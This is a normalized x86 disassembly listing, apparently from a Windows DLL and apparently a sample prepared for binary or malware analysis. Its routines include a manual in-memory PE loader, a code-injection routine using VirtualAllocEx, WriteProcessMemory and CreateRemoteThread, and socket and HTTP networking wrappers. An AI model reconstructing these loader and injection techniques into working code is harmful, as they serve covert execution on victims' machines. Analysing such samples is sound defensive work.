je r-xdata
mov ecx [ ebx + 0x20 ]
jmp r-xdata
mov ecx [ ebx + 0x24 ]
test ecx ecx
sub_1000fab0
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
mov eax [ eax ]
add eax 0xa0
mov ecx [ eax + 0x4 ]
test ecx ecx
jbe r-xdata
pop ebx
retn
mov ecx [ eax ]
mov eax [ ecx + ebx ]
add ecx ebx
test eax eax
jbe r-xdata
push ebp
push esi
push edi
add ecx [ ecx + 0x4 ]
mov eax [ ecx ]
test eax eax
ja r-xdata
xor eax eax
mov ax [ edx ]
mov ebp eax
and ebp 0xfffff000
cmp ebp 0x3000
jne r-xdata
lea edi [ eax + ebx ]
mov eax [ ecx + 0x4 ]
sub eax 0x8
xor esi esi
test eax 0xfffffffe
lea edx [ ecx + 0x8 ]
jbe r-xdata
pop edi
pop esi
pop ebp
mov eax [ ecx + 0x4 ]
inc esi
sub eax 0x8
add edx 0x2
shr eax 0x1
cmp esi eax
jb r-xdata
mov ebp [ esp + 0x18 ]
and eax 0xfff
add eax edi
add [ eax ] ebp
sub_1000fb30
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
mov ebx 0x1
mov eax [ edi ]
mov ebp [ edi + 0x4 ]
add eax 0x80
mov ecx [ eax + 0x4 ]
test ecx ecx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
mov esi [ eax ]
push 0x14
add esi ebp
push esi
mov [ esp + 0x18 ] esi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
add eax ebp
push eax
call [ LoadLibraryA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ edi + 0xc ]
mov edx [ edi + 0x8 ]
lea ecx [ eax * 4 + 0x4 ]
push ecx
push edx
call sub_10008cb7
add esp 0x8
mov [ edi + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov [ eax + ecx * 4 ] ebx
mov edx [ edi + 0xc ]
inc edx
mov [ edi + 0xc ] edx
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
lea edi [ edx + ebp ]
mov esi edi
mov esi [ esi + 0x10 ]
lea edi [ eax + ebp ]
add esi ebp
jmp r-xdata
mov eax [ esp + 0x10 ]
push 0x14
add eax 0x14
push eax
mov [ esp + 0x18 ] eax
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
test eax 0x80000000
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x10 ]
jmp r-xdata
lea eax [ eax + ebp + 0x2 ]
and eax 0xffff
jmp r-xdata
mov eax [ edi + 0x4 ]
add edi 0x4
add esi 0x4
test eax eax
jne r-xdata
push eax
push ebx
call [ GetProcAddress@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
sub_1000fc50
mov ecx [ esp + 0x4 ]
push ebx
push ebp
push esi
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
add ecx 0x78
push edi
mov [ esp + 0x14 ] eax
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi [ ecx ]
mov ecx [ esi + eax + 0x18 ]
add esi eax
test ecx ecx
je r-xdata
mov edx [ esi + 0x14 ]
test edx edx
je r-xdata
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi eax
add ebx eax
xor ebp ebp
test ecx ecx
jbe r-xdata
jmp r-xdata
mov ecx [ edi ]
mov edx [ esp + 0x18 ]
add ecx eax
push ecx
push edx
call sub_10009d30
add esp 0x8
test eax eax
je r-xdata
xor eax eax
mov ax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x18 ]
inc ebp
add edi 0x4
add ebx 0x2
cmp ebp eax
jb r-xdata
cmp eax [ esi + 0x14 ]
ja r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esi + 0x1c ]
pop edi
pop esi
pop ebp
lea edx [ ecx + eax * 4 ]
mov ecx [ esp + 0x8 ]
pop ebx
mov eax [ edx + ecx ]
add eax ecx
retn
sub_1000fcf0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
push 0x0
push 0x0
mov edx [ ecx + 0x28 ]
push eax
add edx eax
call edx
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push edi
xor edi edi
test eax eax
jle r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
mov ecx [ esi + 0x8 ]
push ecx
call sub_1000413e
add esp 0x4
pop edi
push ebx
mov ebx [ FreeLibrary@IAT ]
mov eax [ esi + 0xc ]
inc edi
cmp edi eax
jl r-xdata
push eax
call ebx
mov eax [ esi + 0x8 ]
mov eax [ eax + edi * 4 ]
cmp eax 0xffffffff
je r-xdata
pop ebx
sub_1000fd80
push ecx
push ebx
push esi
push edi
call [ GetCurrentProcessId@IAT ]
push eax
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x18 ]
push 0x40
push 0x1000
push ebx
push 0x0
push esi
call [ VirtualAllocEx@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
or ax 0xffff
pop ebx
pop ecx
retn
mov eax [ esp + 0x14 ]
push 0x0
push ebx
push eax
push edi
push esi
call [ WriteProcessMemory@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push 0x0
push edi
push 0x0
push 0x0
push esi
call [ CreateRemoteThread@IAT ]
push 0x3e8
call [ Sleep@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor ax ax
pop ebx
pop ecx
retn
pop edi
pop esi
or ax 0xffff
pop ebx
pop ecx
retn
sub_1000fe30
mov eax [ rw-data ]
sub esp 0x190
test eax eax
jne r-xdata
xor eax eax
add esp 0x190
retn
lea eax [ esp ]
push eax
push 0x202
call WSAStartup
test eax eax
je r-xdata
mov [ rw-data ] 0x1
or eax 0xffffffff
add esp 0x190
retn
sub_1000fe90
mov eax [ rw-data ]
sub esp 0x10
test eax eax
push esi
push edi
jne r-xdata
mov esi [ esp + 0x1c ]
push esi
call inet_addr
mov edi eax
cmp edi 0xffffffff
mov [ esp + 0x1c ] edi
jne r-xdata
call sub_1000fe30
test eax eax
jge r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
push esi
call gethostbyname
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x10
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov [ eax ] edi
pop edi
xor eax eax
pop esi
add esp 0x10
retn
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
mov edx ecx
lea edi [ esp + 0x1c ]
mov esi [ eax ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x1c ]
push 0x6
push 0x1
push 0x2
call socket
mov esi eax
cmp esi 0xffffffff
jne r-xdata
call sub_1000be60
mov esi eax
test esi esi
jne r-xdata
mov ecx [ esp + 0x20 ]
mov [ esp + 0x8 ] 0x2
push ecx
mov [ esp + 0x10 ] edi
call htons
lea edx [ esp + 0x8 ]
push 0x10
push edx
push esi
mov [ esp + 0x16 ] ax
call connect
inc eax
pop edi
neg eax
sbb eax eax
and eax esi
pop esi
add esp 0x10
retn
mov eax [ esp + 0x20 ]
push eax
call htons
push eax
push edi
push esi
call sub_1000bee0
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x10
retn
push esi
call sub_1000beb0
add esp 0x4
xor eax eax
pop edi
pop esi
add esp 0x10
retn
mov eax esi
pop edi
pop esi
add esp 0x10
retn
sub_1000ffa0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
call closesocket
retn
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000bf30
push esi
call sub_1000beb0
add esp 0x8
pop esi
retn
sub_1000ffd0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x0
push eax
push ecx
push edx
call send
retn
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_1000bf60
add esp 0xc
retn
sub_10010010
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x0
push eax
push ecx
push edx
call recv
retn
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_1000bfc0
add esp 0xc
retn
sub_10010050
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
xor edi edi
test ebx ebx
jle r-xdata
pop edi
mov [ ebx + ebp ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
retn
mov esi ebp
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp [ esi ] 0xa
je r-xdata
mov [ edi + ebp + 0x1 ] 0x0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
inc edi
inc esi
cmp edi ebx
jl r-xdata
mov eax [ esp + 0x1c ]
push 0x1
push esi
push eax
call sub_10010010
add esp 0xc
test eax eax
jle r-xdata
sub_100100b0
mov ecx [ esp + 0x8 ]
sub esp 0x400
lea eax [ esp + 0x40c ]
lea edx [ esp ]
push eax
push ecx
push edx
call sub_10011eac
mov ecx [ esp + 0x410 ]
push eax
lea eax [ esp + 0x10 ]
push eax
push ecx
call sub_1000ffd0
add esp 0x418
retn
sub_100100f0
cmp [ rw-data ] 0x1
jne r-xdata
push 0x404
call sub_100049d2
mov edx eax
add esp 0x4
test edx edx
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push eax
push ecx
call [ InternetOpenA@IAT ]
retn 0x14
push ebx
push esi
push edi
mov ecx 0x101
xor eax eax
mov edi edx
[ edi ]
mov edi [ esp + 0x10 ]
or ecx 0xffffffff
mov [ edx ] eax
lea ebx [ edx + 0x4 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x14
retn 0x14
sub_10010170
mov eax [ rw-data ]
push ebx
push ebp
cmp eax 0x1
push edi
jne r-xdata
push 0x130
call sub_100049d2
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
push eax
push ecx
call [ InternetConnectA@IAT ]
pop edi
pop ebp
pop ebx
retn 0x20
mov ebp [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov ecx 0x4c
xor eax eax
mov edi ebx
and ebp 0xffff
[ edi ]
mov edi [ esp + 0x14 ]
lea eax [ ebx + 0x110 ]
push eax
push ebp
push edi
mov [ ebx ] 0x1
mov [ ebx + 0x4 ] edx
call sub_1000fe90
add esp 0xc
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
pop edi
pop ebp
pop ebx
retn 0x20
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ ebx + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov [ ebx + 0x10c ] ebp
pop edi
pop ebp
pop ebx
retn 0x20
push ebx
call sub_1000413e
add esp 0x4
xor eax eax
pop edi
pop ebp
pop ebx
retn 0x20
sub_10010280
mov eax [ rw-data ]
push esi
cmp eax 0x1
jne r-xdata
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
call [ InternetCloseHandle@IAT ]
pop esi
retn 0x4
mov eax [ esi ]
cmp eax 0x1
jne r-xdata
xor eax eax
pop esi
retn 0x4
cmp eax 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
push ecx
call sub_1000ffa0
add esp 0x4
mov [ esi + 0x8 ] 0x0
push esi
call sub_1000413e
add esp 0x4
mov eax 0x1
pop esi
retn 0x4
push esi
call sub_1000413e
add esp 0x4
mov eax 0x1
pop esi
retn 0x4
mov eax [ esi + 0x1434 ]
test eax eax
je r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
push eax
call sub_1000ffa0
mov ecx [ esi + 0x4 ]
add esp 0x4
mov [ ecx + 0x8 ] 0x0
sub_10010310
mov eax [ rw-data ]
push ebx
push esi
cmp eax 0x1
push edi
jne r-xdata
push 0x1438
call sub_100049d2
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
push eax
push ecx
call [ HttpOpenRequestA@IAT ]
pop edi
pop esi
pop ebx
retn 0x20
mov esi [ esp + 0x10 ]
mov ecx 0x50e
xor eax eax
mov edi ebx
[ edi ]
mov [ ebx ] 0x2
mov [ ebx + 0x4 ] esi
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x20
mov edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0x8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebx + 0x28 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov [ ebx + 0x1430 ] 0x0
mov [ ebx + 0x428 ] 0x0
mov [ ebx + 0x42c ] 0xffffffff
mov [ ebx + 0x1434 ] 0x0
pop esi
pop ebx
retn 0x20
mov eax [ esi + 0x10c ]
lea edx [ esi + 0x110 ]
push edx
lea ecx [ esi + 0xc ]
push eax
push ecx
call sub_1000fe90
add esp 0xc
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
push ebx
call sub_1000413e
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
retn 0x20
sub_10010440
mov eax [ rw-data ]
sub esp 0x400
push ebx
mov ebx 0x1
push ebp
cmp eax ebx
push esi
jne r-xdata
mov ebp [ esp + 0x410 ]
push edi
mov eax [ ebp + 0x4 ]
lea edi [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
lea edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push edx
add ecx 0x4
lea edx [ ebp + 0x28 ]
push ecx
push edx
push edi
push rw-data
push eax
call sub_100100b0
mov eax [ ebp + 0x1430 ]
add esp 0x18
test eax eax
jle r-xdata
mov eax [ esp + 0x420 ]
mov ecx [ esp + 0x41c ]
mov edx [ esp + 0x418 ]
push eax
mov eax [ esp + 0x418 ]
push ecx
mov ecx [ esp + 0x418 ]
push edx
push eax
push ecx
call [ HttpSendRequestA@IAT ]
pop esi
pop ebp
pop ebx
add esp 0x400
retn 0x14
mov ecx [ ebp + 0x4 ]
push r--data
mov edx [ ecx + 0x8 ]
push edx
call sub_100100b0
add esp 0x8
mov eax edi
mov esi rw-data
pop edi
mov edx [ ebp + 0x4 ]
push eax
lea ecx [ ebp + 0x430 ]
mov eax [ edx + 0x8 ]
push ecx
push eax
call sub_1000ffd0
add esp 0xc
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x400
retn 0x14
mov eax [ ebp + 0x4 ]
lea edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
push 0x400
push edx
call sub_10010050
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
lea eax [ esp + 0xc ]
push rw-data
push eax
call sub_1000409a
push rw-data
push 0x0
call sub_1000409a
add esp 0x10
test eax eax
jne r-xdata
mov [ ebp + 0x1434 ] 0x1
pop esi
pop ebp
pop ebx
add esp 0x400
retn 0x14
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push eax
call sub_100050d7
add esp 0x4
cmp eax 0xc8
je r-xdata
mov [ ebp + 0x1434 ] 0x1
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ ebp + 0x4 ]
lea eax [ esp + 0xc ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
push eax
call sub_10010050
add esp 0xc
test eax eax
je r-xdata
xor ebx ebx
mov esi r--data
lea eax [ esp + 0xc ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push 0xe
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x1a
lea edx [ esp + 0x10 ]
push rw-data
push edx
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call sub_100050d7
add esp 0x4
mov [ ebp + 0x42c ] eax
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x11
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp + 0x428 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x4 ]
lea eax [ esp + 0xc ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
push eax
call sub_10010050
add esp 0xc
test eax eax
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov [ ebp + 0x1434 ] 0x1
sub_100106a0
mov eax [ rw-data ]
sub esp 0x400
push ebx
mov ebx 0x1
push ebp
cmp eax ebx
push esi
jne r-xdata
mov ebp [ esp + 0x410 ]
push edi
mov eax [ ebp + 0x4 ]
lea edi [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
lea edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push edx
add ecx 0x4
lea edx [ ebp + 0x28 ]
push ecx
push edx
push edi
push rw-data
push eax
call sub_100100b0
mov eax [ ebp + 0x1430 ]
add esp 0x18
test eax eax
jle r-xdata
mov eax [ esp + 0x420 ]
mov ecx [ esp + 0x41c ]
mov edx [ esp + 0x418 ]
push eax
mov eax [ esp + 0x418 ]
push ecx
mov ecx [ esp + 0x418 ]
push edx
push eax
push ecx
call [ HttpSendRequestExA@IAT ]
pop esi
pop ebp
pop ebx
add esp 0x400
retn 0x14
mov eax [ esp + 0x418 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x4 ]
push eax
lea ecx [ ebp + 0x430 ]
mov eax [ edx + 0x8 ]
push ecx
push eax
call sub_1000ffd0
add esp 0xc
mov ecx [ ebp + 0x4 ]
push r--data
mov edx [ ecx + 0x8 ]
push edx
call sub_100100b0
add esp 0x8
mov eax edi
mov esi rw-data
pop edi
mov edx [ ebp + 0x4 ]
mov ecx [ eax + 0x1c ]
push ecx
push rw-data
mov eax [ edx + 0x8 ]
push eax
call sub_100100b0
add esp 0xc
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x400
retn 0x14
mov eax [ ebp + 0x4 ]
lea edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
push 0x400
push edx
call sub_10010050
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
lea eax [ esp + 0xc ]
push rw-data
push eax
call sub_1000409a
push rw-data
push 0x0
call sub_1000409a
add esp 0x10
test eax eax
jne r-xdata
mov [ ebp + 0x1434 ] 0x1
pop esi
pop ebp
pop ebx
add esp 0x400
retn 0x14
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push eax
call sub_100050d7
add esp 0x4
cmp eax 0xc8
je r-xdata
mov [ ebp + 0x1434 ] 0x1
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ ebp + 0x4 ]
lea eax [ esp + 0xc ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
push eax
call sub_10010050
add esp 0xc
test eax eax
je r-xdata
xor ebx ebx
mov esi r--data
lea eax [ esp + 0xc ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push 0xe
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
push 0x1a
lea edx [ esp + 0x10 ]
push rw-data
push edx
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call sub_100050d7
add esp 0x4
mov [ ebp + 0x42c ] eax
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x11
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10010e80
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp + 0x428 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x4 ]
lea eax [ esp + 0xc ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
push eax
call sub_10010050
add esp 0xc
test eax eax
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov [ ebp + 0x1434 ] 0x1
sub_10010930
mov eax [ rw-data ]
sub esp 0x100
cmp eax 0x1
push esi
push edi
jne r-xdata
mov esi [ esp + 0x10c ]
cmp [ esi + 0x428 ] 0x1
jne r-xdata
mov eax [ esp + 0x118 ]
mov ecx [ esp + 0x114 ]
mov edx [ esp + 0x110 ]
push eax
mov eax [ esp + 0x110 ]
push ecx
push edx
push eax
call [ InternetReadFile@IAT ]
pop edi
pop esi
add esp 0x100
retn 0x10
mov eax [ esi + 0x42c ]
test eax eax
jle r-xdata
mov eax [ esi + 0x42c ]
lea edi [ esi + 0x42c ]
test eax eax
jge r-xdata
jge r-xdata
mov ecx [ esp + 0x114 ]
cmp eax ecx
jle r-xdata
jle r-xdata
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x8 ]
mov edx [ ecx + 0x8 ]
push edx
push 0x100
push eax
call sub_10010050
push edi
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call sub_10011efd
mov eax [ edi ]
add esp 0x18
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x100
retn 0x10
mov edx [ esp + 0x114 ]
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0x110 ]
push edx
mov edx [ ecx + 0x8 ]
push eax
push edx
call sub_10010010
add esp 0xc
test eax eax
jle r-xdata
push eax
push ecx
jmp r-xdata
mov ecx [ esp + 0x114 ]
cmp eax ecx
jle r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
push 0x100
push ecx
call sub_10010050
add esp 0xc
mov ecx [ esp + 0x118 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0x1
add esp 0x100
retn 0x10
mov ecx [ esp + 0x118 ]
pop edi
mov [ ecx ] eax
mov ecx [ esi + 0x42c ]
sub ecx eax
mov eax 0x1
mov [ esi + 0x42c ] ecx
pop esi
add esp 0x100
retn 0x10
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0x114 ]
push eax
mov edx [ ecx + 0x8 ]
push edx
call sub_10010010
add esp 0xc
test eax eax
jl r-xdata
push eax
push ecx
jmp r-xdata
mov edx [ esp + 0x118 ]
mov [ edx ] eax
mov ecx [ edi ]
sub ecx eax
mov [ edi ] ecx
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ esp + 0x114 ]
push edx
mov ecx [ eax + 0x8 ]
push ecx
call sub_10010010
add esp 0xc
test eax eax
jl r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x100
retn 0x10
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
push ecx
push 0x100
push edx
call sub_10010050
add esp 0xc
mov [ edi ] 0xffffffff
sub_10010b00
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
push ecx
mov ecx [ eax + 0x4 ]
push edx
mov edx [ ecx + 0x8 ]
push edx
call sub_1000ffd0
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
call [ InternetWriteFile@IAT ]
retn 0x10
mov ecx [ esp + 0x10 ]
mov [ ecx ] eax
mov eax 0x1
retn 0x10
xor eax eax
retn 0x10
sub_10010b60
mov eax [ rw-data ]
push esi
cmp eax 0x1
push edi
jne r-xdata
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
push edx
push eax
call [ HttpAddRequestHeadersA@IAT ]
pop edi
pop esi
retn 0x10
mov edx [ esp + 0xc ]
mov ecx 0x1000
mov edi [ edx + 0x1430 ]
sub ecx edi
cmp ecx eax
jge r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
mov ecx eax
push ebx
mov ebx ecx
lea edi [ edi + edx + 0x430 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
pop ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx + 0x1430 ]
pop edi
add ecx eax
mov eax 0x1
mov [ edx + 0x1430 ] ecx
pop esi
retn 0x10
pop edi
xor eax eax
pop esi
retn 0x10
sub_10010c00
mov eax [ rw-data ]
sub esp 0x400
push ebx
mov ebx 0x1
push ebp
push esi
cmp eax ebx
push edi
jne r-xdata
mov edi [ esp + 0x414 ]
mov ebp ebx
mov esi rw-data
mov [ edi + 0x1430 ] 0x0
lea eax [ edi + 0x8 ]
mov eax [ esp + 0x420 ]
mov ecx [ esp + 0x41c ]
mov edx [ esp + 0x418 ]
push eax
mov eax [ esp + 0x418 ]
push ecx
push edx
push eax
call [ HttpEndRequestA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn 0x10
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x400
retn 0x10
push 0x12c
call [ Sleep@IAT ]
mov eax [ edi + 0x4 ]
lea edx [ esp + 0x10 ]
mov ecx [ eax + 0x8 ]
push ecx
push 0x400
push edx
call sub_10010050
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_1000409a
push rw-data
push 0x0
call sub_1000409a
add esp 0x10
test eax eax
jne r-xdata
mov [ edi + 0x1434 ] ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn 0x10
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push eax
call sub_100050d7
add esp 0x4
cmp eax 0xc8
je r-xdata
mov [ edi + 0x1434 ] ebx
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ edi + 0x4 ]
lea eax [ esp + 0x10 ]
mov edx [ ecx + 0x8 ]
push edx
push 0x400
push eax
call sub_10010050
add esp 0xc
test eax eax
je r-xdata
xor ebp ebp
mov esi r--data
lea eax [ esp + 0x10 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push 0xe
